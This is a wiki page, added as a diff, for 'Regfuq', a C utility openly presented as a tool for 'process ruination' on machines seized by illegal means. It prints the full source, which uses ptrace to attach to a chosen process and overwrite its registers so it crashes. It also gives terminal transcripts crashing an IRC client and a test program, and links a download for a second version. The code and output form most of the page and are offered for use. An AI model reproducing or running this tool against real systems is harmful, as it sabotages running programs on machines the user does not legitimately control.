@@ -1,0 +1,166 @@
+Regfuq
+Regfuq is a [[BPL]]-licensed utility written by [[nc]]. Its intended purpose is process ruination upon [[computer]] machines commandeered by and for extralegal means.
+
+'''PLEASE ADVISE''': Regfuq version 2 is out!
+Grab regfuq2 @ http://perplexd.info/freecodes/regfuq2.tgz
+Cheq down below for rf2 usage examplez.
+
+==How about some codez, fatty==
+<pre>/*
+ * regfuq.c
+ * --------
+ * little util used to fill the registers of a running process
+ * with garbage, so it segfaults
+ *
+ * copyright (c) 2006 skyy (aka nc) - all rights reserved
+ * released under the bantown public license
+ * http://www.bantown.com/banforge/BPL.txt
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/ptrace.h>
+#include <sys/wait.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <linux/user.h>
+
+char garbage[] = "0xffffffff";
+void usage(char *);
+
+int
+main(int argc, char **argv) {
+	char *prog, *str  = NULL;
+	int ch, stat_;
+	int verbose = 0, esobrev = 0;
+	
+	prog = argv[0];
+	
+	pid_t pid;
+	struct user_regs_struct data_;
+	
+	while ((ch = getopt(argc, argv, "p:e:vxh?")) != EOF) {
+		switch(ch) {
+			case 'p':
+				if (!(pid = atoi(optarg))) {
+					usage(prog);
+				}
+				break;
+			case 'e':
+				str = optarg;
+				break;
+			case 'v':
+				verbose = 1;
+				break;
+			case 'x':
+				esobrev = 1;
+				break;
+			case 'h':
+                        case '?':
+				usage(prog);
+			default :
+				exit(-1);
+		}
+	}
+	argc -= optind;
+	argv += optind;
+
+	if (!pid) usage(prog);
+	if (str == NULL) str = garbage;
+
+	printf("[+] attaching to pid %d\n", pid);
+	ptrace(PTRACE_ATTACH, pid, 0, 0);
+	waitpid(pid, &stat_, 0);
+	printf("[+] pulling registers... ");
+	ptrace(PTRACE_GETREGS, pid, 0, &data_);
+	printf("done.\n");
+
+	if (verbose == 1) {
+		printf("[%%] old esp: 0x%.8lx eip: 0x%.8lx\n", data_.esp, data_.eip);
+		printf("[%%] old ebp: 0x%.8lx edi: 0x%.8lx\n", data_.ebp, data_.edi);
+		printf("[%%] old esi: 0x%.8lx eax: 0x%.8lx\n", data_.esi, data_.eax);
+		printf("[%%] old ebx: 0x%.8lx ecx: 0x%.8lx\n", data_.ebx, data_.ecx);
+		printf("[%%] old edx: 0x%.8lx\n", data_.edx);
+	}
+	
+	printf("[+] setting new registers... ");
+	data_.esp = (long)str;
+	data_.eip = (long)str;
+	data_.ebp = (long)str;
+	data_.eax = (long)str;
+	data_.ebx = (long)str;
+	data_.ecx = (long)str;
+	data_.edx = (long)str;
+	data_.edi = (long)str;
+	data_.esi = (long)str;
+
+	ptrace(PTRACE_SETREGS, pid, NULL, &data_);
+	printf("done.\n");
+	
+	if (esobrev == 1) {
+                printf("[*] new esp: 0x%.8lx eip: 0x%.8lx\n", data_.esp, data_.eip);
+                printf("[*] new ebp: 0x%.8lx edi: 0x%.8lx\n", data_.ebp, data_.edi);
+                printf("[*] new esi: 0x%.8lx eax: 0x%.8lx\n", data_.esi, data_.eax);
+                printf("[*] new ebx: 0x%.8lx ecx: 0x%.8lx\n", data_.ebx, data_.ecx);
+                printf("[*] new edx: 0x%.8lx\n", data_.edx);
+	}
+
+	printf("[+] detaching from pid %d\n", pid);
+	ptrace(PTRACE_DETACH, pid, NULL, NULL);
+	return(0);
+}
+
+void
+usage(char *name) {
+	printf("usage: %s [-xv] [-e <0x%%.8lx>] -p <pid>\n", name);
+	exit(-1);
+}</pre>
+
+==usage examplez==
+<pre>
+[skyy@heroin]~/code/ptrace% ps x | grep irssi
+ 3361 pts/14   S+     0:00 irssi
+ 3364 pts/13   S+     0:00 grep irssi
+[skyy@heroin]~/code/ptrace% ./regfuq -xv -p 3361 -e 0xb00000b5
+[+] attaching to pid 3361
+[+] pulling registers... done.
+[%] old esp: 0xbf871fbc eip: 0xb7b834d9
+[%] old ebp: 0xbf871fc8 edi: 0xb7be5e80
+[%] old esi: 0x08109b68 eax: 0xfffffffc
+[%] old ebx: 0x08186d30 ecx: 0x00000001
+[%] old edx: 0x00000052
+[+] setting new registers... done.
+[*] new esp: 0xbfbc39c4 eip: 0xbfbc39c4
+[*] new ebp: 0xbfbc39c4 edi: 0xbfbc39c4
+[*] new esi: 0xbfbc39c4 eax: 0xbfbc39c4
+[*] new ebx: 0xbfbc39c4 ecx: 0xbfbc39c4
+[*] new edx: 0xbfbc39c4
+[+] detaching from pid 3361
+[skyy@heroin]~/code/ptrace%
+
+</pre>
+
+==regfuq2 usage examplez==
+<pre>
+nc@amour (p5/251)[~/code/regfuq2]$ ps x | grep rftester                                 
+ 8707  p4  S+     0:00.01 ./rftester
+nc@amour (p5/252)[~/code/regfuq2]$ ./regfuq2 -q -v -p 8707
+[1] attaching to pid 8707
+[+] pulling registers... done!
+[x] old eip: 0x400c47e7 esp: 0xbfffe02c
+[x] old ebp: 0xbfffe038 edi: 0x080cbaa0
+[x] old esi: 0x00000000 eax: 0xfffffffc
+[x] old ebx: 0xbfffe050 ecx: 0x00000008
+[x] old edx: 0x401ca8c0
+[+] filling all registers with garbage... done.
+[x] new eip: 0x08049667 esp: 0x08049667
+[x] new ebp: 0x08049667 edi: 0x08049667
+[x] new esi: 0x08049667 eax: 0x08049667
+[x] new ebx: 0x08049667 ecx: 0x08049667
+[x] new edx: 0x08049667
+[2] detaching from pid 8707
+[3] testing pid for crash... done.
+[+] pid 8707 was sucessfully crashed.
+nc@amour (p5/253)[~/code/regfuq2]$
+</pre>
+[[Category:Softwarez]]
